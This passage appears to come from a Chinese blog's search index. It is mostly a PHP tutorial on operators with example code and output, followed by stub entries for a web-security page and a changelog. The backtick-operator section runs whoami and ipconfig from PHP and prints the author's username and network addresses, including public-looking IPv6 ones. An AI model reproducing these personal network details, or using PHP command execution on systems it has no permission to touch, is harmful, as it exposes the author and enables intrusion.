10 10 二、连接运算符 示例代码：\n\u003c?php $name = \"Hailong!\"; $str = \"Hello \".$name.\"\u003cbr/\u003e\"; echo $str.\"\u003cbr/\u003e\"; 运行结果：\nHello Hailong! 三、赋值运算符 示例代码：\n\u003c?php $num1 = 10; $num2 = 3; $num1 += $num2; echo $num1.\"\u003cbr/\u003e\"; $num1 -= $num2; echo $num1.\"\u003cbr/\u003e\"; $num1 *= $num2; echo $num1.\"\u003cbr/\u003e\"; $num1 /= $num2; echo $num1.\"\u003cbr/\u003e\"; $num1 %= $num2; echo $num1.\"\u003cbr/\u003e\"; $num1 .= $num2; echo $num1.\"\u003cbr/\u003e\"; 运行结果：\n13 10 30 10 1 13 四、比较运算符 示例代码：\n\u003c?php $a = 10; $b = 20; var_dump($a == $b); echo \"\u003cbr/\u003e\"; var_dump($a === $b); echo \"\u003cbr/\u003e\"; var_dump($a != $b); echo \"\u003cbr/\u003e\"; var_dump($a \u003c\u003e $b); echo \"\u003cbr/\u003e\"; var_dump($a !== $b); echo \"\u003cbr/\u003e\"; var_dump($a \u003e $b); echo \"\u003cbr/\u003e\"; var_dump($a \u003c $b); echo \"\u003cbr/\u003e\"; var_dump($a \u003e= $b); echo \"\u003cbr/\u003e\"; var_dump($a \u003c= $b); echo \"\u003cbr/\u003e\"; 运行结果：\nbool(false) bool(false) bool(true) bool(true) bool(true) bool(false) bool(true) bool(false) bool(true) Note\n== ：等于，在数据类型不同时会进行数据类型转换，然后进行比较（0 == \"\"）。 === ：全等，在数据类型不同时不会进行数据类型转换，只有数据类型相同且值相等时才为 true。 != ：不等于，在数据类型不同时会进行数据类型转换，然后进行比较（1 != \"\"）。 !== ：不全等，在数据类型不同时不会进行数据类型转换，只有数据类型相同且值不等时才为 false Warning\nPHP 中规定使用 echo 输出布尔类型的时候，echo true 会在页面中输出 1，echo false 在页面中无输出，建议使用 var_dump() 输出结果。\n五、逻辑运算符 示例代码：\n\u003c?php $a = true; $b = false; var_dump($a and $b); echo \"\u003cbr/\u003e\"; var_dump($a \u0026\u0026 $b); echo \"\u003cbr/\u003e\"; var_dump($a or $b); echo \"\u003cbr/\u003e\"; var_dump($a || $b); echo \"\u003cbr/\u003e\"; var_dump($a xor $b); echo \"\u003cbr/\u003e\"; var_dump(!$a); echo \"\u003cbr/\u003e\"; 运行结果：\nbool(false) bool(false) bool(true) bool(true) bool(true) bool(false) 六、? : 运算符 示例代码：\n\u003c?php $a = 10; $b = 20; echo ($a \u003e $b ? \"true\" : \"false\").\"\u003cbr/\u003e\"; 运行结果：\nfalse 七、反引号运算符 使用反引号 `` 运算符可以调用系统命令\n示例代码：\n\u003c?php header('Content-Type: text/html; charset=GBK'); $cmd1 = \"whoami\"; $cmd2 = \"ipconfig\"; echo \"\u003cpre\u003e\".`$cmd1`; echo \"\u003cpre\u003e\".`$cmd2`; 运行结果：\nhailo-laptop\\puppy Windows IP 配置 以太网适配器 以太网: 媒体状态 . . . . . . . . . . . . : 媒体已断开连接 连接特定的 DNS 后缀 . . . . . . . : 无线局域网适配器 本地连接* 9: 媒体状态 . . . . . . . . . . . . : 媒体已断开连接 连接特定的 DNS 后缀 . . . . . . . : 无线局域网适配器 本地连接* 10: 媒体状态 . . . . . . . . . . . . : 媒体已断开连接 连接特定的 DNS 后缀 . . . . . . . : 无线局域网适配器 WLAN: 连接特定的 DNS 后缀 . . . . . . . : IPv6 地址 . . . . . . . . . . . . : 2409:8a0c:240:bbe0:e609:ee1a:c4cb:a87e 临时 IPv6 地址. . . . . . . . . . : 2409:8a0c:240:bbe0:5105:5a5a:5c8:8ca4 本地链接 IPv6 地址. . . . . . . . : fe80::2773:6473:2699:b0eb%18 IPv4 地址 . . . . . . . . . . . . : 192.168.1.82 子网掩码 . . . . . . . . . . . . : 255.255.255.0 默认网关. . . . . . . . . . . . . : fe80::1a4f:43ff:fe2d:cbd6%18 192.168.1.1 以太网适配器 VMware Network Adapter VMnet1: 连接特定的 DNS 后缀 . . . . . . . : 本地链接 IPv6 地址. . . . . . . . : fe80::5:b2a7:da70:4287%21 IPv4 地址 . . . . . . . . . . . . : 192.168.131.1 子网掩码 . . . . . . . . . . . . : 255.255.255.0 默认网关. . . . . . . . . . . . . : 以太网适配器 VMware Network Adapter VMnet8: 连接特定的 DNS 后缀 . . . . . . . : 本地链接 IPv6 地址. . . . . . . . : fe80::c0bb:4949:6737:4218%4 IPv4 地址 . . . . . . . . . . . . : 192.168.126.1 子网掩码 . . . . . . . . . . . . : 255.255.255.0 默认网关. . . . . . . . . . . . . : 隧道适配器 Teredo Tunneling Pseudo-Interface: 连接特定的 DNS 后缀 . . . . . . . : IPv6 地址 . . . . . . . . . . . . : 2001:0:2851:b9f0:1094:8ae6:90cb:a465 本地链接 IPv6 地址. . . . . . . . : fe80::1094:8ae6:90cb:a465%12 默认网关. . . . . . . . . . . . . : Warning\nheader() 是 PHP 中的一个函数，用于发送 HTTP 响应头到客户端（通常是浏览器）。由于 Windows 的命令行默认使用 GBK 编码方式，为避免输出乱码问题，可以使用 header('Content-Type: text/html; charset=GBK'); 更改网页编码。\n八、@运算符 使用 echo @$k; 可以屏蔽表达式可能发生的错误信息\n示例代码：\n\u003c?php echo $k; 运行结果：\nNotice: Undefined variable: k in D:\\Workspace\\php\\learning\\operator.php on line 3 "},"title":"运算符"},"/docs/web-%E6%9E%B6%E6%9E%84%E5%AE%89%E5%85%A8/":{"data":{"":"\rWeb 架构解析"},"title":"Web 架构安全"},"/logs/":{"data":{"2025-04-18#2025-04-18":"博客更新日志 (Blog Changelog)记录博客的所有更新、功能增强、设计变更等。\n2025-04-18 新增 修复 改进 ","博客更新日志-blog-changelog#博客更新日志 (Blog Changelog)":""},"title":"_index"}}